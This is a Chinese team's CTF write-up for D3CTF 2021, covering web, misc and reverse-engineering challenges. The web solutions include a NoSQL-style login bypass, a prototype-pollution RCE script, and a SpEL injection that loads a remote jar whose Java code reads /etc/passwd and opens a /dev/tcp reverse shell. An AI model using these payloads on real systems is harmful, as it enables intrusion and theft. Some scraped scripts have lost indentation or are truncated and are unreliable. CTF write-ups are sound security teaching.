@@ -1,0 +1,1512 @@
+# D3CTF wp By ez_team
+
+阅读量 **196268**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-03-10 10:00:57
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p1.ssl.qhimg.com/t018442f3af15d0a90a.png)
+
+## Web
+
+###  8bithub
+
+json sql注入 登录admin账号
+
+    
+    
+    {"username":"admin","password":{"password":1}}
+    
+
+服务端使用`sendmailer`包发邮件，通过调试可以进行原型链污染实现RCE
+
+Exp如下
+
+    
+    
+    import requests as r
+    
+    tmp = r.post('http://7281fd0fb4.8bit-pub.d3ctf.io/user/signin',json={"username":"admin","password":{"password":1}}, verify=False)
+    
+    print(tmp.text)
+    
+    data = {
+        "constructor.prototype.args": ["-c", "/readflag > '/tmp/.asd'"],
+        "constructor.prototype.path": "/bin/sh",
+        "constructor.prototype.sendmail": ["1"],
+        "subject": "1",
+        "text": "1",
+        "to": "eki@bupt.edu.cn"
+    }
+    
+    res = r.post('http://7281fd0fb4.8bit-pub.d3ctf.io/admin/email', cookies=tmp.cookies, json=data, verify=False)
+    
+    print(res.text)
+    
+    data = {
+        "subject": "1",
+        "text": "1",
+        "to": "eki@bupt.edu.cn",
+        "attachments":{
+            "path":"/tmp/.asd"
+        }
+    }
+    
+    res = r.post('http://7281fd0fb4.8bit-pub.d3ctf.io/admin/email', cookies=tmp.cookies, json=data, verify=False)
+    
+    print(res.text)
+    
+
+###  Happy_Valentine’s_Day
+
+在/love 里面传了一个name一个password  
+发现name会将参数传进去
+
+    
+    
+    <!-- I'm so sorry that the preview feature is under development, and it's not secure. -->
+    <!-- So only internal staff can use it. -->
+    <!-- <a href="/1nt3na1_pr3v13w">Preview</a> -->
+    
+
+所以有漏洞的页面就是`/1nt3na1_pr3v13w`  
+FUZZ一下发现  
+name参数为[[${12*12}]]  
+在/1nt3na1_pr3v13w可以输出为144  
+所以可以确实是spel注入  
+之后有一个waf  
+]]前加上换行就可以绕过  
+下方java打包成jar  
+love传POST
+
+    
+    
+    name=[[${new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://xxx/Cmd.jar")}).loadClass("Cmd").getConstructor().newInstance().toString()}
+    ]]
+    
+
+之后访问/1nt3na1_pr3v13w即可反弹shell
+
+    
+    
+    import java.io.*;
+    import java.util.*;
+    
+    public class Cmd {
+        String res;
+    
+        public Cmd() {
+            try {
+                File dir = new File("/");
+                String[] children = dir.list();
+                if (children == null) {
+                } else {
+                    for (int i = 0; i < children.length; i++) {
+                        String filename = children[i];
+                        res += filename + '\n';
+                    }
+                }
+    
+                BufferedReader in = new BufferedReader(new FileReader("/etc/passwd"));
+                String str;
+                while ((str = in.readLine()) != null) {
+                    res += str + '\n';
+                }
+                String cmd = "'bash -i >& /dev/tcp/xxxx/9999 0>&1'";
+                String[] cmdstr = { "/bin/sh", "-c", cmd };
+                Runtime.getRuntime().exec(cmdstr);
+    
+                Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxxx/9999 0>&1");
+    
+    
+    
+    
+            } catch (IOException e) {
+                res += e.toString();
+            }
+        }
+    
+        @Override
+        public String toString() {
+            return res;
+        }
+    }
+    
+
+连进去发现没有权限  
+打包成tar  
+放到vps上之后将
+
+CVE-2021-3156
+
+    
+    
+    Sudoedit -s /
+    存在可利用sudo漏洞的报错
+    
+
+![](https://p1.ssl.qhimg.com/t01d70aecffef1c8b16.png)
+
+## Misc
+
+###  Robust
+
+首先拿到流量包 发现为QUIC协议，一种udp协议（更加稳定）。  
+既然给了SSlkey.log首先就是进行解包。  
+可以得到http3 协议的包文件。  
+可以导出流查看，发现是每差值为4进行一个流的传递。
+
+![](https://p1.ssl.qhimg.com/t0117e5813103b8d7a9.png)
+
+这个包传递了一个html，然后下面的包传递了m3u8 是一种
+
+    
+    
+    标签用于指定 m3u8 文件的全局参数或在其后面的切片文件/媒体播放列表的一些信息
+    
+
+可以发现音频共被切片成 17份，而第16个包。
+
+![](https://p1.ssl.qhimg.com/t01a8a99f5e9c282c69.png)
+
+通过搜索发现，此应为数据中的enc.key.加密方法是aes-128-cbc  
+那么密钥应该是32个的16进制字符。  
+在放出Hint前一直被蛊惑，后来意识到应该是左边的16进制数据。  
+但是后面的ts文件比较特殊，headers需要被去掉。有的末尾有SegmentFault也要去掉。  
+通过追踪流提取原始数据来提取。  
+以0.ts为例  
+从这个包的data段开始
+
+![](https://p3.ssl.qhimg.com/t0168141eb14d56909e.png)
+
+这个包的data段结束
+
+![](https://p4.ssl.qhimg.com/t01a87a944e82190e37.png)
+
+即可提取出所有的ts文件  
+随后利用 openssl解密所有的ts文件。
+
+    
+    
+    import os
+    for i in range(0,17):
+        os.system("openssl aes-128-cbc -d -in {}.ts -out audit{}.ts -nosalt -iv 00000000000000000000000000000000 -K 34363238656561363031396632323631".format(i,i))
+    
+
+可以得到完整的音频，这里题目作者给出了提示modem解调，还给了一个github链接，里面第一个就提到了quiet工具。我们通过查看频谱也发现，高频段有人耳听不见的数据。  
+https://github.com/quiet/quiet。  
+我们也尝试了quiet-js，但是没有效果，且使用比较受限，容错率低，于是就老老实实部署编译quiet。  
+主要的部署脚本在<https://github.com/quiet/quiet/blob/master/.travis.yml>，跟着一步一步复制粘贴就能得到可以解题的”quiet_decode_file”可执行文件。最后多个配置尝试下来，用的是ultrasonic配置才解开。具体命令(首先要将提出来的wav重命名为encoded.wav)：`quiet_decode_file
+ultrasonic flag.file`  
+通过这个工具可以成功解调频 得到 flag.file  
+经过cyberchef自动识别，可以发现是一个zip.  
+zip里面给出了 信息， 网易云音乐， 音乐id以及歌词json 。  
+可以想到明文攻击，通过明文攻击可以打开压缩包。  
+发现另一个txt是一个 中国的galgame的剧本。  
+用010可以发现其中有读不到的空白字符。想到零宽度隐写。
+
+![](https://p0.ssl.qhimg.com/t0145e129a0426b43ba.png)
+
+然后base85一把梭
+
+![](https://p3.ssl.qhimg.com/t010e550d6c82764d82.png)
+
+###  easyQuantum
+
+是一个类量子加密通讯。  
+可以通过如下的这个链接来学习  
+<https://zhuanlan.zhihu.com/p/80113695>  
+从中我们可以得知。只要测量基一样。那么这个密钥就是被确定的。  
+流量包里的数据都是pickle序列化过的。  
+那么除了流量中的过短数据 需要抛出当前段和上一段数据外。  
+以及第一段数据声明了密钥长度。  
+结尾给出了密文。 可知是亦或加密的。  
+那么除此之外其他数据均为3个一组。进行比对而后取得密钥串。  
+通过查看流量，有序列化的痕迹，换了各种版本的python与各种包，最后确定是python3的pickle序列化，且用了numpy的库，所以说，第一步要反序列化，接下来再考虑量子通信计算。  
+为了方便操作，我把四种状态换成了字母进行处理。下面是我的脚本。
+
+    
+    
+    import pickle
+    import numpy
+    
+    # [0,1] -> |0> -> w 
+    # [1,0] -> |1> -> s
+    # [+,-] -> |0> + |1> -> a
+    # [+,+] -> |0> - |1> -> d
+    
+    
+    # 0 0 -> |0>       -> w 
+    # 0 1 -> |1>       -> s
+    # 1 0 -> |0> + |1> -> a
+    # 1 1 -> |0> - |1> -> d
+    
+    name = "src_50000.txt"
+    content = open(name).read()
+    content = content.strip()
+    content = content.split("\n")
+    
+    Q = []
+    Q_fin = []
+    ali = []
+    bob = []
+    bob_fin = []
+    
+    
+    def QTrans(ll):
+        tmp = []
+        for l in ll:
+            if l[0] == 0 and l[1] == 1:
+                tmp.append("w")
+                continue
+            if l[0] == 1 and l[1] == 0:
+                tmp.append("s")
+                continue
+            if l[1] < 0:
+                tmp.append("a")
+                continue
+            if l[1] > 0:
+                tmp.append("d")
+                continue
+        Q_fin.append(tmp)
+    
+    for i in content:
+        a = (pickle.loads(bytes.fromhex(i)))
+        if type(a) == list and type(a[0]) == numpy.ndarray: # Quantum
+            QTrans(a)
+        else:
+            ali.append(a)
+    print(ali[-1])
+    
+    name = "src_52926.txt"
+    content = open(name).read()
+    content = content.strip()
+    content = content.split("\n")
+    for i in content:
+        a = (pickle.loads(bytes.fromhex(i)))
+        bob.append(a)
+    for i in range(len(Q_fin)):
+        if not type(bob[i]) == str:
+            Q.append(Q_fin[i])
+            bob_fin.append(bob[i])
+    
+    ali = ali[1:-1]
+    
+    
+    for i in range(len(Q)):
+        print("Alice:",ali[i],"Q",Q[i],"Bob",bob_fin[i])
+    
+    # [0,1] -> |0> -> w 
+    # [1,0] -> |1> -> s
+    # [+,-] -> |0> + |1> -> a
+    # [+,+] -> |0> - |1> -> d
+    
+    
+    # 0 0 -> |0>       -> w 
+    # 0 1 -> |1>       -> s
+    # 1 0 -> |0> + |1> -> a
+    # 1 1 -> |0> - |1> -> d
+    
+    key = []
+    
+    def keyGen():
+        for i in range(len(ali)):
+            for j in range(4):
+                # print(Q[i][j],bob_fin[i][j],ali[i][j])
+                if Q[i][j] == "w" and bob_fin[i][j] == 0:
+                    key.append(0)
+                if Q[i][j] == "s" and bob_fin[i][j] == 0:
+                    key.append(1)  
+                if Q[i][j] == "a" and bob_fin[i][j] == 1:
+                    key.append(0)
+                if Q[i][j] == "d" and bob_fin[i][j] == 1:
+                    key.append(1)
+    keyGen()
+    
+
+这里的key最后要取反再异或后面那个十六进制，反正我也没整明白到底是咋回事，能整出flag就完事了hhhh
+
+###  SignIn
+
+Tg群。
+
+###  Virtual Love
+
+Strings 一把梭
+
+###  Virtual Love Revenge
+
+可以机灵的发现原来flag的地方变成了压缩包密码
+
+![](https://p0.ssl.qhimg.com/t0122e61f7d4629d26c.png)
+
+![](https://p2.ssl.qhimg.com/t0107cd75b29fc990a2.png)
+
+一把梭
+
+###  Virtual Love Revenge 2.0
+
+打开虚拟机发现被加密，按道理来说硬盘也会被加密，但是没有，估计是伪加密一类的  
+给了iso镜像文件，本地用这个镜像文件建一个虚拟机，硬盘大小设为20g  
+通过对比自己本地的虚拟机vmdk和题目给的vmdk，发现了一些问题，并修复  
+修复vmdk
+
+![](https://p5.ssl.qhimg.com/t01c82e0059d99380ae.png)
+
+修复其他s00x.vmdk文件，把本地的前面一部分直接复制粘贴过去，需要修复“22”前面的文件头
+
+![](https://p3.ssl.qhimg.com/t01dc5cde827b1f1312.png)
+
+而后我们可以通过一个从给定的iso来加载新的虚拟磁盘。
+
+![](https://p5.ssl.qhimg.com/t018268a47ee5c5ac39.png)
+
+加载后通过题目描述guest成员可以无密码登录。  
+之后通过 cat ~/.bash_history 获取信息可以发现  
+提示登录root用户。  
+通过010editor 观察 发现。  
+修复的vmdk 002中存在如下数据（已经修改）
+
+![](https://p5.ssl.qhimg.com/t015aa031d44de622bb.png)
+
+这里的root密码可以被我们修改。
+
+    
+    
+    python3 -c 'import crypt,getpass;pw=getpass.getpass();print(crypt.crypt(pw) if (pw==getpass.getpass("Confirm: ")) else exit())'
+    
+
+然后填入到数据里面（这里密码为root)  
+就可以实现登录了
+
+![](https://p2.ssl.qhimg.com/t0141386ad170ee4bef.png)
+
+根据这里面的压缩包密码和提示即可解出flag。
+
+###  shellgen2
+
+​
+感觉题目改了一次，waf拦截的变少了。需要用户构造一个python脚本来获取之前生成随机字符串，再生产php脚本输出一样的字符串，难点在waf限定了能用的字符和对脚本长度要求。
+
+    
+    
+     if not phpshell.startswith(b'<?php'):
+            return True
+        phpshell = phpshell[6:]
+        for c in phpshell:
+            if c not in b'0-9$_;+[].=<?>':
+                return True
+            else:
+                print(chr(c), end='')
+    
+
+​ 故可利用php字符累加的特性获得所需要的字母。
+
+​ 参考<http://www.thespanner.co.uk/2012/08/21/php-nonalpha-tutorial/>
+
+​ 首先需要`a`，可利用`$_=[].[]`被转为`ArrayArray`的特性获取字母，如果是常用的`''.[]`会被waf。
+
+![](https://p2.ssl.qhimg.com/t015be85d7b425b93db.png)
+
+方法一  
+显示太长了
+
+    
+    
+    def waf(phpshell):
+        if not phpshell.startswith('<?php'):
+            return False
+        phpshell = phpshell[5:]
+        for c in phpshell:
+            if c not in '0-9$_;+[].':
+                return False
+        return True
+    
+    
+    
+    prefix = '<?php $_=[].[];$__=0;$__++;$__++;$__++;$_=$_[$__];'
+    # $_= 'a'
+    
+    end = """
+    <?=$___?>
+    """
+    
+    
+    def genchar(c,i):
+        t = ord(c)-ord('a')
+        x = "${0}".format("_"*i)
+        poc = x+"=$_;"
+        if t>0:
+            for i in range(t):
+                poc+=x+"++;"
+        else:
+            for i in range(t):
+                poc+=x+"--;"
+        return poc
+    
+    def genstr(randomStr):
+        poc = prefix
+        for i in range(len(randomStr)):
+            poc += genchar(c=randomStr[i],i=i+4)
+        poc+="?>"
+        for i in range(len(randomStr)):
+            poc += "<?="+"${0};".format("_"*(i+4))+"?>"
+        poc+=">"
+        return poc[:-1]
+    
+    print(genstr(input()))
+    
+
+方法二  
+构造出所有字符的表示方法，因为waf规定只能由0和9，所以参数名字只能用`_09`实现。最后输出时使用段标签`<?=xx>`
+
+    
+    
+    target=input()
+    st="<?php $_=[].[];$__=0;$__++;$__++;$__++;$_0=$_[$__];"
+    keylist="_09"
+    strlist={}
+    p=0
+    for i in range(3):
+        for j in range(3):
+            for k in range(3):
+                strlist[p]= "$_"+keylist[i]+keylist[j]+keylist[k]
+                p+=1
+    for i in range(26):
+        st+=strlist[i]+"=$_0;"
+        st+="$_0++;"
+    st+="?>"
+    for c in target:
+        st+="<?="+strlist[ord(c)-97]+";?>"
+    print(st,end='')
+    
+
+## Re
+
+###  ancient
+
+  * （非常恶心的一道题，不知道预期解是什么方式，我是猜+爆破出来的，过两天看看别的队的师傅是咋搞的
+
+####  分析
+
+  * 在 IDA 中打开文件，无壳，但是字符串也都被加密过了
+  * `main` 函数有一处花指令，patch 掉之后就能看伪代码了
+  * 这里是输入之后的预判断，可知长度为 56，开头为 `d3ctf`  
+
+  * 然后就是一路经过了几次拷贝，反正不太重要，跟一遍就能看懂，就是把输入串接到了程序一开始打印的提示后面，称这个变量为 `plaintext` 吧
+  * 然后来到了关键的 `malloc` 处  
+
+  * `malloc` 这里开辟了一个 `buffer`，接下来的两条指令初始化了一个加密时候会用到的东西，把它叫做 `context` 吧
+  * 这里就是进行了加密  
+
+  * 在加密函数里一定会来到这个 `else` 分支，里面的这个函数每次接收 `context` 和 `plaintext` 的一个字符，还有之前初始化的 `buffer`  
+
+  * 动调可以发现， `buffer` 每次经过这个 `subEnc` 函数会多增加一个密文，但这也不完全是一个流密码，因为产生第 n 位密文的同时会影响之前的若干个（多数是 1 个密文）
+  * 加密出来之后与在 `init` 阶段初始化的密文进行比较，相等的字符数量要 `>=178` 才行，把相等的字符数记为 `cmp`
+  * 这个函数会导致程序卡死，里面全是花指令，把花指令全部 `patch` 掉之后分析，发现是在对之前比较的 `cmp` 进行反复的操作，似乎是奇数加一偶数减一，所以直接 `patch` 掉就行了  
+
+  * 然后根据 `cmp` 是由大于 `178` 判断输入是否正确
+
+####  解决
+
+  * `subEnc` 看了老半天没看懂，懒得看了
+  * 之后想的第一件事就是能不能用自动化分析工具进行一下黑盒测试，因为 178 减去程序之前输出的 `hint` 的长度基本等于输入字符串的长度，所以新增加一位正确的明文，有大概率会新产生一位正确的密文
+  * 这里我选择用 `pin tools` 进行黑盒测试，主要的思路就是枚举所有的输入，然后让程序运行到 `0x401C87` 处。如下图所示，这地方会把 `cmp` 放到寄存器里，在这里插个桩然后让 `pin` 输出一下 `rdi` 的值就可以知道这时候产生了几位正确的密文了
+  * 直接在最常用的 `inscount0` 里面魔改了  
+
+  * 然后写个 Python 脚本爆破输入。
+
+    
+    
+    from collections import defaultdict
+    from subprocess import Popen, PIPE
+    import string
+    import threading
+    import itertools
+    
+    charset = [‘_’]
+    for i in string.ascii_uppercase:
+    
+    charset.append(i)
+    for i in string.ascii_lowercase:
+    
+    charset.append(i)
+    for i in range(10):
+    
+    charset.append(chr(ord('0')+i))
+    class PinInsCountHandler:
+    def init(self, target_p, pin_p: str = “./pin”, lib_path: str = “./obj-intel64/inscount0.so”) -> None:
+    pin_path = pin_p
+    target_path = target_p
+    self.process = Popen(
+    [pin_path, ‘-t’, lib_path, ‘—‘, target_path], stdin=PIPE, stdout=PIPE)
+    
+      def sendline(self, content):
+          if type(content) == str:
+              content = content.encode()
+          content += b'\n'
+          self.process.stdin.write(content)
+    
+      def recv(self):
+          while True:
+              content = self.process.communicate()[0].decode()
+              if content:
+                  return content
+    def get_cmp(flag):
+    pin = PinInsCountHandler(“./problem”)
+    pin.sendline(flag)
+    output = pin.recv()
+    count = int(output.split(“Cmp: “)[1])
+    return count
+    
+    def pad_flag(flag):
+    prefix = ‘d3ctf{‘
+    suffix = ‘}’
+    
+      pad_len = 56-len(prefix)-len(suffix)-len(flag)
+      padded = prefix+flag+pad_len*'_'+suffix
+      return padded
+    get_cmp(pad_flag())
+    limit = threading.Semaphore(value=6)
+    
+    class MyTh(threading.Thread):
+    flag = ‘w0W_sEems_u_bRe4k_uP_tHe_H1DdeN_s7R’
+    
+      def __init__(self, sub_flag, result: dict) -> None:
+          super().__init__()
+          self.sub_flag = sub_flag
+          self.result = result
+    
+      def run(self):
+          try:
+              self.run_my_code()
+          finally:
+              limit.release()
+    
+      def run_my_code(self):
+          _flag = pad_flag(MyTh.flag+self.sub_flag)
+          cmp = get_cmp(_flag)
+          print(self.sub_flag, cmp)
+          self.result[cmp].append(self.sub_flag)
+    def multi_thread_bruteforce():
+    result = defaultdict(list)
+    ts = []
+    for s in itertools.permutations(charset, 2):
+    limit.acquire()
+    tmp = ‘’.join(s)
+    t = MyTh(tmp, result)
+    ts.append(t)
+    t.start()
+    for t in ts:
+    t.join()
+    return result
+    
+    re = multi_thread_bruteforce()
+    print(re)
+
+这个脚本基本就相当于一个深度优先搜索吧，但是想了想，感觉剪枝不太好写，加之爆了几位发现 flag 是有字面意思的，所以就人工剪枝了（草  
+说一下爆破的大致流程吧，最开始 flag 是 ”，此时爆前一位或前两位，发现 ‘w0’ 会让相等的密文数量增加，由此就可以确定前两位，然后接着把脚本里面的
+flag 改成 ‘w0’，接着爆 3、4 位，可以猜 + 爆破出 ‘w0W_’，以此类推  
+这里第一次用多线程 + pin
+的方式做题，本来以为会非常快，但是创建子进程的开销还是太大了，所以在自己电脑上跑的贼慢，不过做题的时候居然也忍了，最后做的差不多了才想起来可以租 vps
+，在腾讯云租了个 64 核的 vps 之后试了试发现快的一批，早这样的话估计能留出时间再做道逆向的 qaq  
+反复运行上面这个脚本，最后就把整个 `flag` 爆出来了  
+flag: d3ctf{w0W_sEems_u_bRe4k_uP_tHe_H1DdeN_s7R_By_Ae1tH_c0De}
+
+### No Name
+
+实际逻辑存在于data.enc中，进行解密后释放到jar，然后动态加载为虚拟机字节码进行执行  
+加载完之后还会立即删除data.jar  
+由于开启了保护，无法进行hook获得实际解密密钥，使用apktool解包重打包  
+删除掉NoNmae smail中的delet语句，重新打包，autosign签名  
+，签名之后直接安装  
+打开应用后在/data/data/com.d3ctf.noname目录下找到data.jar  
+查看逻辑是一个简单的异或，异或回去即可
+
+    
+    
+    #include <stdio.h>
+    
+    int main()
+    {
+        int i=0;
+        int test[]={49, 102, 54, 33, 51, 46, 0x60, 52, 109, 97, 102, 52, 97, 55, 55, 97, 52, 0x60, 0x60, 109, 51, 101, 103, 101, 100, 98, 109, 103, 109, 54, 97, 55, 52, 98, 97, 98, 0x60, 99, 40};
+        for(i=0;i<39;i++){
+            printf("%c",test[i]^85);
+        }
+    
+        return 0;
+    }
+
+###  jumpjump
+
+![](https://p3.ssl.qhimg.com/t01d7176285f3ff2497.png)
+
+在函数sub_40189D中判断长度为36，然后将字符串异或一个定值0x57储存起来
+
+![](https://p1.ssl.qhimg.com/t0131b273d1727fe99f.png)
+
+动调跟到这个位置进行了一次简单的处理，之后应该就是比较了，将密文提出来  
+进行解密
+
+    
+    
+    #include <stdio.h>
+    
+    int main()
+    {
+        int i=0;
+        unsigned char ida_chars[] =
+        {
+            0x09, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x06, 0x00, 
+            0x00, 0x00, 0x5A, 0x00, 0x00, 0x00, 0x5B, 0x00, 0x00, 0x00, 
+            0x0A, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x05, 0x00, 
+            0x00, 0x00, 0x4D, 0x00, 0x00, 0x00, 0x57, 0x00, 0x00, 0x00, 
+            0x56, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x0B, 0x00, 
+            0x00, 0x00, 0x4D, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 
+            0x09, 0x00, 0x00, 0x00, 0x55, 0x00, 0x00, 0x00, 0x40, 0x00, 
+            0x00, 0x00, 0x4D, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 
+            0x06, 0x00, 0x00, 0x00, 0x59, 0x00, 0x00, 0x00, 0x0B, 0x00, 
+            0x00, 0x00, 0x4D, 0x00, 0x00, 0x00, 0x55, 0x00, 0x00, 0x00, 
+            0x54, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x57, 0x00, 
+            0x00, 0x00, 0x5B, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 
+            0x0B, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x05, 0x00, 
+            0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 
+            0x09, 0x00, 0x00, 0x00, 0x08, 0xF0, 0x49, 0x00, 0x00, 0x00, 
+            0x00, 0x00, 0x96, 0xF1, 0x49, 0x00, 0x00, 0x00, 0x00, 0x00
+        };
+    
+    
+        for(i=0;i<144;i+=4){
+          printf("%c",((ida_chars[i]^0x33)-4)^0x57);
+        }
+        return 0;
+    }
+    
+
+得到flag
+
+###  whitegive
+
+全部是混淆，动调确定常量，其中的各种复杂位运算其实都是与或加法的复杂写法，很容易找出规律  
+就是套娃  
+然后一步步跟进，发现字符串要求是64字节，每4字节生成32字节，然后得到了512字节的数据  
+最后有sbox置换（是一个可逆的置换盒），加法和异或等加密得到最后的512与数据对比，判断对错  
+所以可以先反向得到加密前的512字节  
+4字节来爆破生成的32字节，来对比确定4字节对不对，最后得到flag
+
+    
+    
+    #include<cstdio>
+    #include<cstdlib>
+    #include<cstring>
+    unsigned char flag[65];
+    unsigned char buf1[1000];
+    
+    unsigned char real_buf1[512] = {
+      0x2B, 0x75, 0xDD, 0x89, 0x55, 0x4C, 0x62, 0xE2, 0xF0, 0xFC, 
+      0x2A, 0x56, 0x51, 0x4D, 0x41, 0x44, 0x1E, 0x7C, 0x88, 0x17, 
+      0x92, 0xBD, 0xA5, 0xE6, 0xF1, 0xAD, 0x27, 0xE0, 0xE0, 0x19, 
+      0xFD, 0x3F, 0xC7, 0x5A, 0x87, 0xD2, 0xF9, 0x77, 0xD7, 0x26, 
+      0x7C, 0xA6, 0xCA, 0xBF, 0x72, 0x69, 0x03, 0x6B, 0xDE, 0x54, 
+      0xD0, 0xDD, 0xE6, 0x8A, 0x2E, 0xDE, 0x61, 0x47, 0x76, 0x5C, 
+      0xB2, 0x66, 0xB0, 0x9B, 0x77, 0xBC, 0xE4, 0x90, 0xDC, 0x57, 
+      0x9C, 0x81, 0x61, 0x63, 0x2D, 0x6D, 0xDB, 0x73, 0x1A, 0xE3, 
+      0x7E, 0xB7, 0xC2, 0x96, 0x68, 0x4C, 0xAC, 0x2E, 0x1F, 0x04, 
+      0x79, 0x0B, 0x37, 0xE3, 0x7E, 0xF6, 0x2E, 0x1D, 0x91, 0xF8, 
+      0x70, 0xF5, 0x7C, 0xDC, 0x16, 0x29, 0x9A, 0x14, 0xD9, 0xE8, 
+      0xE8, 0xF0, 0xB8, 0x9B, 0xA7, 0xD4, 0xE3, 0x87, 0xA8, 0x0D, 
+      0x36, 0x8C, 0x47, 0xA4, 0x37, 0x67, 0x7C, 0x9F, 0x18, 0xB0, 
+      0x39, 0xC3, 0xF9, 0x31, 0xB6, 0x2B, 0xC6, 0x21, 0x17, 0x74, 
+      0x47, 0x6A, 0x87, 0xDB, 0x3A, 0xAB, 0x1D, 0xFF, 0x14, 0x76, 
+      0xF2, 0x5E, 0x33, 0xC4, 0xCC, 0xAA, 0xFB, 0xA9, 0x39, 0x3F, 
+      0xFD, 0xD6, 0x64, 0xC6, 0x41, 0x5F, 0xB8, 0x70, 0xF3, 0x00, 
+      0x0F, 0x6D, 0xC6, 0x63, 0xFA, 0xC3, 0x36, 0xD3, 0x44, 0x12, 
+      0xE6, 0x9A, 0xCC, 0x36, 0xB0, 0x96, 0x60, 0x05, 0x03, 0x91, 
+      0x29, 0x22, 0xB7, 0x1A, 0xD1, 0x74, 0xB9, 0x9C, 0x6F, 0xA9, 
+      0x1E, 0x39, 0x90, 0x1D, 0xD8, 0xD1, 0x29, 0x83, 0xFA, 0x65, 
+      0xD9, 0x73, 0x1B, 0x69, 0x1E, 0xDD, 0xE1, 0x71, 0x11, 0xA6, 
+      0xB1, 0xD4, 0x44, 0x7E, 0x7D, 0xC4, 0xD9, 0x97, 0xF1, 0x45, 
+      0xA3, 0x34, 0x96, 0xD8, 0x64, 0x60, 0x51, 0x86, 0x13, 0xE6, 
+      0x79, 0x90, 0x7C, 0x22, 0x49, 0x9A, 0x33, 0xC8, 0x6D, 0x9C, 
+      0x1F, 0xC4, 0x69, 0x10, 0xB0, 0x15, 0xFC, 0x9A, 0xC8, 0xAC, 
+      0x2A, 0xDD, 0x84, 0xE4, 0xE5, 0x89, 0x0F, 0x8B, 0x69, 0x0E, 
+      0x3A, 0xFE, 0xE0, 0xE6, 0x98, 0x36, 0x65, 0x42, 0xF2, 0x66, 
+      0x40, 0x43, 0xBE, 0x26, 0x8F, 0x15, 0x58, 0x7A, 0x21, 0xEE, 
+      0xEB, 0xF0, 0x9D, 0xF7, 0x33, 0x4D, 0xAA, 0x3B, 0x63, 0xA6, 
+      0x0D, 0xB8, 0x3A, 0x4E, 0x11, 0x80, 0x36, 0x3F, 0xD0, 0xB4, 
+      0x5E, 0xBA, 0xBB, 0x92, 0x57, 0xF5, 0x7B, 0x33, 0xF9, 0x66, 
+      0xBB, 0xD2, 0xCE, 0xC8, 0x19, 0x8B, 0x1D, 0x67, 0x39, 0xAB, 
+      0xFF, 0x3D, 0xEA, 0x3F, 0xE6, 0x15, 0xFB, 0xA9, 0x46, 0x4F, 
+      0xFF, 0xF7, 0x00, 0xF5, 0x1F, 0xB6, 0x5F, 0xCE, 0x32, 0x2E, 
+      0x28, 0xD2, 0xF1, 0x21, 0x7E, 0x7A, 0xA3, 0x0C, 0xDE, 0x2E, 
+      0xBD, 0x1C, 0x88, 0x9E, 0x7F, 0x12, 0xCD, 0x59, 0x9D, 0x45, 
+      0x13, 0x45, 0x19, 0x75, 0x0F, 0x6B, 0xBA, 0x74, 0x20, 0x74, 
+      0x18, 0xA0, 0x89, 0xD3, 0x01, 0x63, 0xE6, 0x11, 0x34, 0x04, 
+      0x68, 0x5A, 0x6A, 0xB7, 0xB2, 0x36, 0x6E, 0x16, 0x6E, 0xA0, 
+      0x06, 0x52, 0xEC, 0x7C, 0x0F, 0xC0, 0x3D, 0x37, 0xCF, 0xDF, 
+      0x80, 0x74, 0x69, 0x20, 0x5D, 0xBE, 0x8C, 0xAB, 0x5E, 0x11, 
+      0x1A, 0x44, 0x4A, 0xE0, 0x6A, 0xAF, 0x3B, 0x04, 0x7D, 0x79, 
+      0x09, 0xE5, 0x46, 0x0E, 0xEE, 0x9D, 0x36, 0xA8, 0xB1, 0x39, 
+      0xB0, 0xF0, 0x5F, 0x02, 0x60, 0x63, 0xBB, 0xFB, 0xC4, 0xBB, 
+      0x01, 0xF4, 0x8A, 0xDE, 0x3C, 0x06, 0x90, 0x1F, 0x8C, 0x47, 
+      0xC4, 0x04, 0x8E, 0x9D, 0xBF, 0xAD, 0x95, 0x84, 0x68, 0x89, 
+      0x9A, 0x4F, 0xF4, 0x6B, 0x52, 0x73, 0x0D, 0xEC, 0x99, 0x83, 
+      0x61, 0x2F, 0xB3, 0x1B, 0x8F, 0xD8, 0x84, 0x1F, 0x91, 0xA6, 
+      0xBF, 0xBE, 0x63, 0xA0, 0xEE, 0x16, 0xD5, 0x70, 0x73, 0xFC, 
+      0xD9, 0x4E, 0x8E, 0xE0, 0x92, 0xEF, 0x4A, 0xEB, 0xEB, 0xCB, 
+      0x7E, 0xA7
+    };
+    gned char rand_arr[300];
+    unsigned char box[256];
+    unsigned char tmp[520]; 
+    
+    unsigned int a[9]={0x6A09E667,0x0BB67AE85,0x3C6EF372,0x0A54FF53A,0x510E527F,0x9B05688C,0x1F83D9AB,0x5BE0CD19};
+    unsigned int consts[65]={
+     0x428A2F98,0x71374491,0x0B5C0FBCF,0x0E9B5DBA5,0x3956C25B,0x59F111F1,0x923F82A4,0x0AB1C5ED5
+    ,0x0D807AA98,0x12835B01,0x243185BE,0x550C7DC3,0x72BE5D74,0x80DEB1FE,0x9BDC06A7,0x0C19BF174
+    ,0x0E49B69C1,0x0EFBE4786,0x0FC19DC6,0x240CA1CC,0x2DE92C6F,0x4A7484AA,0x5CB0A9DC,0x76F988DA
+    ,0x983E5152,0x0A831C66D,0x0B00327C8,0x0BF597FC7,0x0C6E00BF3,0x0D5A79147,0x6CA6351,0x14292967
+    ,0x27B70A85,0x2E1B2138,0x4D2C6DFC,0x53380D13,0x650A7354,0x766A0ABB,0x81C2C92E,0x92722C85
+    ,0x0A2BFE8A1,0x0A81A664B,0x0C24B8B70,0x0C76C51A3,0x0D192E819,0x0D6990624,0x0F40E3585,0x106AA070
+    ,0x19A4C116,0x1E376C08,0x2748774C,0x34B0BCB5,0x391C0CB3,0x4ED8AA4A,0x5B9CCA4F,0x682E6FF3
